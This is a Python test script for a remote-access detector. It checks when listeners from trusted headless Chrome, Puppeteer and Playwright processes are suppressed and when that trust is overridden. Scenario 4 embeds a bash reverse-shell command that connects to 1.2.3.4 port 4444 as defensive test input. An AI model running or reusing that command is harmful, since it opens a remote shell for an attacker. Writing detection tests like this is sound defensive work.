import asyncio
import os
import sys
import time

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

from config.manager import RemoteAccessDetectorConfig
from core.datatypes import Severity
from core.event_bus import EventBus
from core.process_correlation import _Correlation
import modules.remote_access_detector as rad_mod
from modules.remote_access_detector import RemoteAccessDetector, classify_event_taxonomy
from modules.process_anomaly_detector import ProcessSnapshot


def _parent_snap(pid=100, uid=1000, exe="/usr/bin/node"):
    return ProcessSnapshot(
        pid=pid, ppid=1, uid=uid, gid=uid, exe=exe, cwd="/home/newus/project",
        cmdline="node server.js", username="newus", start_time=time.time() - 500,
        project=None, network_active=False, start_time_ticks=1,
    )


def _chrome_snap(pid, ppid, uid, path_substring, cmdline_suffix="", cwd="/home/newus/project"):
    exe = f"/home/newus{path_substring}chrome"
    cmdline = f"{exe} --headless --remote-debugging-port=0{cmdline_suffix}"
    return ProcessSnapshot(
        pid=pid, ppid=ppid, uid=uid, gid=uid, exe=exe, cwd=cwd, cmdline=cmdline,
        username="newus", start_time=time.time() - 10, project=None,
        network_active=True, start_time_ticks=pid,
    )


async def _run_investigate(rad, pid, port, *, bind_ip="127.0.0.1", identity_changed=False):
    bus_events = []
    orig_publish = rad.publish

    def capture(ev):
        bus_events.append(ev)

    rad.publish = capture
    try:
        await rad._investigate(pid, port=port, process_name="chrome", bind_ip=bind_ip, identity_changed=identity_changed)
    finally:
        rad.publish = orig_publish
    assert len(bus_events) == 1, f"expected exactly one published event, got {len(bus_events)}"
    return bus_events[0]


async def main():
    real_read_snapshot = rad_mod.read_process_snapshot
    real_correlate_pid = rad_mod.correlate_pid

    snapshots = {}

    def fake_read_snapshot(pid):
        return snapshots.get(pid)

    async def fake_correlate_pid(pid, username, ppid, *, port=None, conf_directory=None, resolve_cloudpanel=True):
        return _Correlation()

    rad_mod.read_process_snapshot = fake_read_snapshot
    rad_mod.correlate_pid = fake_correlate_pid

    try:
        bus = EventBus()
        rad = RemoteAccessDetector(bus, RemoteAccessDetectorConfig())

        snapshots[100] = _parent_snap()
        snapshots[601] = _chrome_snap(601, 100, 1000, "/.cache/puppeteer/chrome/linux-1/chrome-linux/")
        event = await _run_investigate(rad, 601, 40001)
        assert event.severity == Severity.INFO, event.severity
        assert event.metadata["process_classification"] == "TRUSTED_PUPPETEER"
        assert event.metadata["classification"] == "TRUSTED_AUTOMATION"
        assert event.metadata["notify_discord"] is False
        assert event.metadata["suppressed_alert"] == "REMOTE_ACCESS_BACKDOOR"
        assert event.metadata["suppression_reason"].startswith("trusted_process_profile:")
        assert "trusted_application_listener" in event.metadata["evidence"]
        print("Scenario 1 (trusted Puppeteer, first detection, unmanaged: suppressed, classified TRUSTED_AUTOMATION) PASSED")

        snapshots[602] = _chrome_snap(602, 100, 1000, "/.cache/ms-playwright/chromium-1/chrome-linux/")
        event = await _run_investigate(rad, 602, 40002)
        assert event.severity == Severity.INFO, event.severity
        assert event.metadata["process_classification"] == "TRUSTED_PLAYWRIGHT"
        assert event.metadata["classification"] == "TRUSTED_AUTOMATION"
        assert event.metadata["notify_discord"] is False
        print("Scenario 2 (trusted Playwright, first detection, unmanaged: suppressed, classified TRUSTED_AUTOMATION) PASSED")

        snapshots[603] = _chrome_snap(603, 100, 1000, "/.local-browsers/chromium-1/chrome-linux/")
        event = await _run_investigate(rad, 603, 40003)
        assert event.severity == Severity.INFO, event.severity
        assert event.metadata["process_classification"] == "TRUSTED_CHROME"
        assert event.metadata["classification"] == "TRUSTED_AUTOMATION"
        assert event.metadata["notify_discord"] is False
        print("Scenario 3 (trusted plain Chrome, first detection, unmanaged: suppressed, classified TRUSTED_AUTOMATION) PASSED")

        snapshots[604] = _chrome_snap(
            604, 100, 1000, "/.cache/puppeteer/chrome/linux-1/chrome-linux/",
            cmdline_suffix=" -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'",
        )
        event = await _run_investigate(rad, 604, 40004)
        assert event.metadata["process_classification"] == "TRUSTED_PUPPETEER"
        assert event.severity != Severity.INFO, (
            f"a trusted profile match must never suppress a genuinely suspicious command: {event.severity}"
        )
        assert event.metadata.get("notify_discord") is not False
        assert "suspicious_command" in event.metadata["evidence"]
        assert event.metadata["classification"] != "TRUSTED_AUTOMATION"
        print("Scenario 4 (trusted process + suspicious shell-payload command: trust overridden, full alert) PASSED")

        snapshots[605] = _chrome_snap(605, 100, 1000, "/.cache/puppeteer/chrome/linux-1/chrome-linux/")
        event = await _run_investigate(rad, 605, 40005, identity_changed=True)
        assert event.severity != Severity.INFO, (
            f"a trusted profile match must never suppress a genuine ownership/identity change: {event.severity}"
        )
        assert event.metadata.get("notify_discord") is not False
        assert "identity_changed" in event.metadata["evidence"]
        print("Scenario 5 (trusted process + ownership/identity change on same port: trust overridden, full alert) PASSED")

        snapshots[106] = _parent_snap(pid=106, uid=0, exe="/usr/bin/node")
        snapshots[607] = _chrome_snap(607, 106, 0, "/.cache/puppeteer/chrome/linux-1/chrome-linux/")
        event = await _run_investigate(rad, 607, 40007)
        assert event.metadata["process_classification"] == "TRUSTED_PUPPETEER"
        assert event.severity != Severity.INFO, (
            f"a trusted profile match must never suppress a system-UID listener: {event.severity}"
        )
        assert "system_uid" in event.metadata["evidence"]
        print("Scenario 6 (trusted process running as system UID: trust overridden, full alert) PASSED")

        snapshots[608] = _chrome_snap(608, 100, 1000, "/.cache/puppeteer/chrome/linux-1/chrome-linux/")
        event = await _run_investigate(rad, 608, 40008, bind_ip="0.0.0.0")
        assert event.metadata["process_classification"] == "TRUSTED_PUPPETEER"
        assert event.severity != Severity.INFO, (
            f"a trusted profile match must never suppress an internet-exposed listener: {event.severity}"
        )
        assert "internet_exposed" in event.metadata["evidence"]
        print("Scenario 7 (trusted process bound to 0.0.0.0/internet-exposed: trust overridden, full alert) PASSED")

        rad_no_suppress = RemoteAccessDetector(
            bus, RemoteAccessDetectorConfig(suppress_trusted_listener_alerts=False),
        )
        snapshots[609] = _chrome_snap(609, 100, 1000, "/.cache/puppeteer/chrome/linux-1/chrome-linux/")
        event = await _run_investigate(rad_no_suppress, 609, 40009)
        assert event.severity != Severity.INFO, (
            "with suppress_trusted_listener_alerts=False, trust must never auto-downgrade severity"
        )
        assert event.metadata.get("notify_discord") is not False
        print("Scenario 8 (suppress_trusted_listener_alerts=False: trust never bypasses severity, config-gated not hardcoded) PASSED")

        assert classify_event_taxonomy(
            known_match=False, trust_classification="TRUSTED_PUPPETEER", severity=Severity.HIGH, evidence=[],
        ) != "TRUSTED_AUTOMATION", (
            "classification label must never say TRUSTED_AUTOMATION when the published severity is HIGH"
        )
        assert classify_event_taxonomy(
            known_match=False, trust_classification="TRUSTED_PUPPETEER", severity=Severity.HIGH, evidence=[],
        ) == "SUSPICIOUS"
        print("Scenario 9 (classify_event_taxonomy: trust label never disagrees with a non-INFO published severity) PASSED")

    finally:
        rad_mod.read_process_snapshot = real_read_snapshot
        rad_mod.correlate_pid = real_correlate_pid

    print("\nALL REMOTE-ACCESS TRUST-SEVERITY OVERRIDE TESTS PASSED")


asyncio.run(main())
